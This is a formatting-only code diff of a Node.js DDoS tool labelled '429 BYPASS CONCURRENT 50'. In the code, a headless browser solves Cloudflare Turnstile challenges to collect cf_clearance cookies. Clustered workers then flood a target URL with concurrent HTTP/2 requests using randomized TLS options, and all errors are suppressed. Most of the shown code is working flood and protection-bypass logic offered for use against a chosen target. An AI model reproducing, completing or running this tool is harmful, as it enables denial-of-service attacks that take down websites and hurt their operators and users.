@@ -29,7 +29,7 @@ const sigalgs = [
     "rsa_pkcs1_sha512"
 ];
 
-const secureOptions = 
+const secureOptions =
     crypto.constants.SSL_OP_NO_SSLv2 |
     crypto.constants.SSL_OP_NO_SSLv3 |
     crypto.constants.SSL_OP_NO_TLSv1 |
@@ -136,9 +136,9 @@ function flood(userAgent, cookie) {
             secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)],
             rejectUnauthorized: false
         });
-        
+
         tlsSocket.on('error', () => {
-             if(!tlsSocket.destroyed) tlsSocket.destroy();
+            if (!tlsSocket.destroyed) tlsSocket.destroy();
         });
 
         const client = http2.connect(parsed.href, {
@@ -168,16 +168,16 @@ function flood(userAgent, cookie) {
                     request.on("response", (res) => {
                         global.successRequests = (global.successRequests || 0) + 1;
                         global.totalRequests = (global.totalRequests || 0) + 1;
-                        
+
                         if (res[":status"] === 429 || res[":status"] === 503) {
-                            client.close(); 
+                            client.close();
                         }
                     });
 
                     request.on("error", () => {
                         global.failedRequests = (global.failedRequests || 0) + 1;
                     });
-                    
+
                     request.end();
                 }
             }, intervalTime);
@@ -191,7 +191,7 @@ function flood(userAgent, cookie) {
         client.on("error", () => {
             if (!client.destroyed) client.destroy();
         });
-        
+
     } catch (err) {
         // Catch synchronous errors
     }
@@ -201,10 +201,10 @@ function flood(userAgent, cookie) {
 async function bypassCloudflareOnce(attemptNum) {
     let browser = null;
     let page = null;
-    
+
     try {
         console.log("\x1b[33m[CF Bypass] Attempt " + attemptNum + "...\x1b[0m");
-        
+
         const response = await connect({
             headless: false,
             turnstile: true,
@@ -219,52 +219,52 @@ async function bypassCloudflareOnce(attemptNum) {
             },
             disableXvfb: false
         });
-        
+
         if (!response || !response.browser) {
             throw new Error("Failed to launch browser");
         }
-        
+
         browser = response.browser;
         page = response.page;
-        
+
         console.log("\x1b[33m[CF Bypass] Accessing " + args.target + "...\x1b[0m");
-        
+
         await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });
-        
+
         // Tunggu challenge selesai
         let challengeCompleted = false;
         let checkCount = 0;
-        
+
         while (!challengeCompleted && checkCount < 60) {
             await new Promise(r => setTimeout(r, 1000));
             const cookies = await page.cookies();
             const cfClearance = cookies.find(c => c.name === "cf_clearance");
-            
+
             if (cfClearance) {
                 challengeCompleted = true;
                 break;
             }
             checkCount++;
         }
-        
+
         const cookies = await page.cookies();
         const cfClearance = cookies.find(c => c.name === "cf_clearance");
         const userAgent = await page.evaluate(() => navigator.userAgent);
-        
+
         if (browser) await browser.close();
-        
+
         if (cfClearance) {
-             console.log("\x1b[32m[CF Bypass] Success! Got cf_clearance\x1b[0m");
-             return { cookies, userAgent, success: true };
+            console.log("\x1b[32m[CF Bypass] Success! Got cf_clearance\x1b[0m");
+            return { cookies, userAgent, success: true };
         } else {
-             console.log("\x1b[31m[CF Bypass] Failed - No cf_clearance\x1b[0m");
-             return { cookies: [], userAgent, success: false };
+            console.log("\x1b[31m[CF Bypass] Failed - No cf_clearance\x1b[0m");
+            return { cookies: [], userAgent, success: false };
         }
-        
+
     } catch (error) {
         console.log("\x1b[31m[CF Bypass] Error: " + error.message + "\x1b[0m");
         if (browser) {
-            try { await browser.close(); } catch(e) {}
+            try { await browser.close(); } catch (e) { }
         }
         return { success: false };
     }
@@ -273,11 +273,11 @@ async function bypassCloudflareOnce(attemptNum) {
 async function bypassCloudflareParallel(totalCount) {
     console.log("\x1b[35m429 BYPASS - CONCURRENT 50\x1b[0m");
     const results = [];
-    
-    for(let i = 0; i < totalCount; i++) {
+
+    for (let i = 0; i < totalCount; i++) {
         const res = await bypassCloudflareOnce(i + 1);
-        if(res.success) results.push(res);
-        if(results.length >= totalCount) break;
+        if (res.success) results.push(res);
+        if (results.length >= totalCount) break;
     }
 
     if (results.length === 0) {
@@ -297,13 +297,13 @@ function runFlooder() {
 
     const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => c.name + "=" + c.value).join("; ") : "";
     const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-    
+
     flood(userAgent, cookieString);
 }
 
 function displayStats() {
     const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
-    
+
     console.clear();
     console.log("\x1b[31m======[ 429 BYPASS CONCURRENT 50 ]======\x1b[0m");
     console.log("\x1b[36mTarget:\x1b[0m " + args.target);
@@ -323,22 +323,22 @@ global.bypassData = [];
 if (cluster.isMaster) {
     console.clear();
     console.log("\x1b[35m429 BYPASS SYSTEM - CONCURRENT 50\x1b[0m");
-    
+
     (async () => {
         const bypassResults = await bypassCloudflareParallel(args.cookieCount);
         global.bypassData = bypassResults;
-        
+
         console.log("\n\x1b[32mGot " + bypassResults.length + " sessions. Forking " + args.threads + " workers...\x1b[0m");
-        
+
         global.startTime = Date.now();
-        
+
         for (let i = 0; i < args.threads; i++) {
             const worker = cluster.fork();
             worker.send({ type: 'bypassData', data: bypassResults });
         }
-        
+
         const statsInterval = setInterval(displayStats, 1000);
-        
+
         cluster.on('message', (worker, message) => {
             if (message.type === 'stats') {
                 global.totalRequests += message.total || 0;
@@ -346,23 +346,23 @@ if (cluster.isMaster) {
                 global.failedRequests += message.failed || 0;
             }
         });
-        
+
         setTimeout(() => {
             clearInterval(statsInterval);
             console.log("\n\x1b[32mAttack completed.\x1b[0m");
             process.exit(0);
         }, args.time * 1000);
     })();
-    
+
 } else {
     process.on('message', (msg) => {
         if (msg.type === 'bypassData') {
             global.bypassData = msg.data;
-            
+
             for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                 setTimeout(() => runFlooder(), i * 50);
             }
-            
+
             setInterval(() => {
                 process.send({
                     type: 'stats',
@@ -378,5 +378,5 @@ if (cluster.isMaster) {
     });
 }
 
-process.on('uncaughtException', (e) => {});
-process.on('unhandledRejection', (e) => {});
+process.on('uncaughtException', (e) => { });
+process.on('unhandledRejection', (e) => { });
